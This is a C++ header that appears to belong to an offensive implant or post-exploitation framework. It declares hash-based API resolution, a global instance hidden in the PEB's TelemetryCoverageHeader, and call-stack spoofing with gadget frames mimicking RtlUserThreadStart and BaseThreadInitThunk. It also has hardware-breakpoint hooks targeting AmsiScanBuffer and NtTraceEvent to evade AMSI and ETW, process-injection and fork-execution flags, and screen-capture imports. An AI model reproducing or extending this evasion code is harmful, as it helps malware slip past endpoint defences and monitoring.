#ifndef GENERAL_HPP
#define GENERAL_HPP

#include <Native.hpp>
#include <ntstatus.h>

#define Dbg1( x, ... ) Instance.Win32.DbgPrint( x, ##__VA_ARGS__ )
#define Dbg2( x, ... ) Instance->Win32.DbgPrint( x, ##__VA_ARGS__ )

#define PIPE_BUFFER_LENGTH  0x10000
#define DECLAPI( x )       decltype( x ) * x
#define G_INSTANCE         INSTANCE* Instance = (INSTANCE*)( NtCurrentPeb()->TelemetryCoverageHeader );
#define DECLFN             __attribute__( ( section( ".text$B" ) ) )

#define min(a, b) ((a) < (b) ? (a) : (b))

#define NtCurrentThreadID HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )

#define RSL_IMP( w, m ) { \
    for ( int i = 1; i < HashPlural<decltype( Instance->w, m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &w )[ i ] = LoadApi( m, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

EXTERN_C PVOID StartPtr();
EXTERN_C PVOID EndPtr();
EXTERN_C PVOID SpoofCall( ... );

auto FindGadget(
    _In_ PVOID  ModuleBase,
    _In_ UINT16 RegValue
) -> PVOID;

auto LoadApi(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR;

auto LoadModule(
    _In_ const ULONG LibHash
) -> UPTR;

template <typename T>
constexpr SIZE_T StructCount() {
    SIZE_T Count = 0;
    SIZE_T StructLen   = sizeof( T );

    while ( StructLen > Count * sizeof( UPTR ) ) {
        Count++;
    }

    return Count;
}

template <typename T = char>
inline auto DECLFN HashStr(
    _In_ const T* String
) -> UPTR {
    ULONG CstHash = 0x515528a;
    BYTE  Value   = 0;

    while ( * String ) {
        Value = static_cast<BYTE>( *String++ );

        if ( Value >= 'a' ) {
            Value -= 0x20;
        }

        CstHash ^= Value;
        CstHash *= 0x01000193;
    }

    return CstHash;
}

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

struct _FRAME_INFO {
    PVOID Ptr;  // pointer to function + offset
    UPTR  Size; // stack size
};
typedef _FRAME_INFO FRAME_INFO;

struct _STACK_FRAME {
    WCHAR* DllPath;
    ULONG  Offset;
    ULONG  TotalSize;
    BOOL   ReqLoadLib;
    BOOL   SetsFramePtr;
    PVOID  ReturnAddress;
    BOOL   PushRbp;
    ULONG  CountOfCodes;
    BOOL   PushRbpIdx;
};
typedef _STACK_FRAME STACK_FRAME;

#define KH_METHOD_INLINE 0x15
#define KH_METHOD_FORK   0x20

#define KH_INJECT_EXPLICIT 0x100
#define KH_INJECT_SPAWN    0x200

struct _INSTANCE {
    PVOID HeapHandle;
    PVOID Start;
    UPTR  Size;

    struct {
        BOOL  IsSpoof;
        BOOL  KeepLoad;
        ULONG Bypass;
        ULONG ExecMethod;
        ULONG ForkCategory;
    } Ctx;

    struct {
        CHAR*  Name;
        HANDLE Write;
        HANDLE Read;
    } Pipe;
    
    struct {
        FRAME_INFO First;   // 0x00  // RtlUserThreadStart+0x21
        FRAME_INFO Second;  // 0x10  // BaseThreadInitThunk+0x14
        FRAME_INFO Gadget;  // 0x20  // rbp gadget
        
        UPTR Restore;      // 0x30
        UPTR Ssn;          // 0x38
        UPTR Ret;          // 0x40
        
        UPTR Rbx;          // 0x48
        UPTR Rdi;          // 0x50
        UPTR Rsi;          // 0x58
        UPTR R12;          // 0x60
        UPTR R13;          // 0x68
        UPTR R14;          // 0x70
        UPTR R15;          // 0x78

        UPTR ArgCount;     // 0x80
    } Spf;

    struct {
        UPTR KernelBase;
        UPTR Kernel32;
        UPTR Ntdll;

        DECLAPI( NtClose );
        DECLAPI( DbgPrint );

        DECLAPI( GetProcAddress );
        DECLAPI( GetModuleHandleA );
        DECLAPI( LoadLibraryA );

        DECLAPI( NtProtectVirtualMemory );

        DECLAPI( RtlAllocateHeap );
        DECLAPI( RtlReAllocateHeap );
        DECLAPI( RtlFreeHeap );

        DECLAPI( GetConsoleWindow );
        DECLAPI( AllocConsoleWithOptions );
        DECLAPI( FreeConsole );
        
        DECLAPI( CreatePipe );
        DECLAPI( CreateNamedPipeA );
        DECLAPI( ConnectNamedPipe );
        DECLAPI( DisconnectNamedPipe );
        DECLAPI( CreateFileA );
        DECLAPI( WriteFile );
        DECLAPI( ReadFile );
        DECLAPI( FlushFileBuffers );
        DECLAPI( SetStdHandle );
        DECLAPI( GetStdHandle );

        DECLAPI( RtlLookupFunctionEntry );
        DECLAPI( RtlUserThreadStart );
        DECLAPI( BaseThreadInitThunk );

        DECLAPI( WaitForSingleObject );

        DECLAPI( RtlExitUserProcess );
        DECLAPI( RtlExitUserThread  );

        DECLAPI( IsWindowVisible );
        DECLAPI( GetCurrentProcessId );
        DECLAPI( ProcessIdToSessionId );
        DECLAPI( GetHandleInformation );
        
        DECLAPI( CreateDCA );
        DECLAPI( GetDeviceCaps );
        DECLAPI( DeleteDC );
        DECLAPI( GetObjectA );
        DECLAPI( GetStockObject );
        DECLAPI( GetDC );
        DECLAPI( ReleaseDC );
        DECLAPI( CreateCompatibleDC );
        DECLAPI( CreateCompatibleBitmap );
        DECLAPI( SelectObject );
        DECLAPI( PrintWindow );
        DECLAPI( BitBlt );
        DECLAPI( ShowWindow );
        DECLAPI( SetWindowLongA );
        DECLAPI( SetLayeredWindowAttributes );
        DECLAPI( UpdateWindow );
        DECLAPI( GetWindowRect );
        DECLAPI( GlobalAlloc );
        DECLAPI( GlobalLock );
        DECLAPI( GlobalUnlock );
        DECLAPI( GlobalFree );
        DECLAPI( GetWindowPlacement );
        DECLAPI( GetWindowThreadProcessId );
        DECLAPI( EnumWindows );
        DECLAPI( GetSystemMetrics );
        DECLAPI( SetWindowPos );
        DECLAPI( DeleteObject );
        DECLAPI( SelectPalette );
        DECLAPI( RealizePalette );
        DECLAPI( GetDIBits );
    } Win32;

    struct {
        PVOID Handler;
        BOOL  Init;

        PVOID NtTraceEvent;
        PVOID AmsiScanBuffer;
        PVOID ExitPtr;

        UPTR Addresses[4];
        UPTR Callbacks[4];
    } Hwbp;
};
typedef _INSTANCE INSTANCE;

namespace Spoof {
    auto Call(
        _In_ UPTR Fnc, 
        _In_ UPTR Ssn, 
        _In_ UPTR Arg1  = 0,
        _In_ UPTR Arg2  = 0,
        _In_ UPTR Arg3  = 0,
        _In_ UPTR Arg4  = 0,
        _In_ UPTR Arg5  = 0,
        _In_ UPTR Arg6  = 0,
        _In_ UPTR Arg7  = 0,
        _In_ UPTR Arg8  = 0,
        _In_ UPTR Arg9  = 0,
        _In_ UPTR Arg10 = 0,
        _In_ UPTR Arg11 = 0,
        _In_ UPTR Arg12 = 0
    ) -> PVOID;

    auto StackSize(
        UPTR RtmFunction,
        UPTR ImgBase
    ) -> UPTR;

    auto StackSizeWrapper(
        PVOID RetAddress
    ) -> UPTR;
}

struct _PARSER {
    CHAR*   Original;
    CHAR*   Buffer;
    UINT32  Size;
    UINT32  Length;
};
typedef _PARSER PARSER;

namespace Heap {
    template <typename T>   
    auto DECLFN Alloc(
        UPTR Size
    ) -> T {
        G_INSTANCE
        return reinterpret_cast<T>( Instance->Win32.RtlAllocateHeap( Instance->HeapHandle, HEAP_ZERO_MEMORY, Size ) );
    }

    template <typename T>
    auto DECLFN ReAlloc(
        T    Block,
        UPTR Size
    ) -> T {
        G_INSTANCE
        return reinterpret_cast<T>( Instance->Win32.RtlReAllocateHeap( Instance->HeapHandle, HEAP_ZERO_MEMORY, Block, Size ) );
    }

    static auto DECLFN Free( PVOID Block ) -> BOOL {
        G_INSTANCE
        return Instance->Win32.RtlFreeHeap( Instance->HeapHandle, 0, Block );
    }
}

namespace Str {
    auto StartsWith(
        BYTE* Str, 
        BYTE* Prefix
    ) -> BOOL;

    auto CompareW( 
        LPCWSTR Str1, 
        LPCWSTR Str2 
    ) -> INT;

    auto LengthA( 
        LPCSTR String 
    ) -> SIZE_T;

    auto LengthW( 
        LPCWSTR String 
    ) -> SIZE_T;

    auto CharToWChar( 
        PWCHAR Dest, 
        PCHAR  Src, 
        SIZE_T MaxAllowed 
    ) -> SIZE_T;
}

namespace Mem {
    auto Copy(
        _In_ PVOID Dst,
        _In_ PVOID Src,
        _In_ UPTR  Size
    ) -> PVOID;

    auto Set(
        _In_ PVOID Addr,
        _In_ UCHAR Val,
        _In_ UPTR  Size
    ) -> void;

    auto Zero(
        _In_ PVOID Addr,
        _In_ UPTR  Size
    ) -> void;
}

namespace Parser {
    auto New( 
        _In_ PARSER* parser, 
        _In_ PVOID   Buffer
    ) -> VOID;

    auto Pad(
        _In_  PARSER* parser,
        _Out_ ULONG size
    ) -> BYTE*;

    auto Byte(
        _In_ PARSER* Parser
    ) -> BYTE;

    auto Int16(
        _In_ PARSER* Parser
    ) -> INT16;

    auto Int32(
        _In_ PARSER* Parser
    ) -> INT32;

    auto Int64(
        _In_ PARSER* Parser
    ) -> INT64;

    auto Bytes(
        _In_  PARSER* parser,
        _Out_ ULONG*  size = 0
    ) -> BYTE*;

    auto Str( 
        _In_ PARSER* parser, 
        _In_ ULONG*  size = 0
    ) -> PCHAR;

    auto Wstr(
        _In_ PARSER* parser, 
        _In_ ULONG*  size  = 0
    ) -> PWCHAR;

    auto Destroy(
        _In_ PARSER* Parser 
    ) -> BOOL;
}

#endif // GENERAL_HPP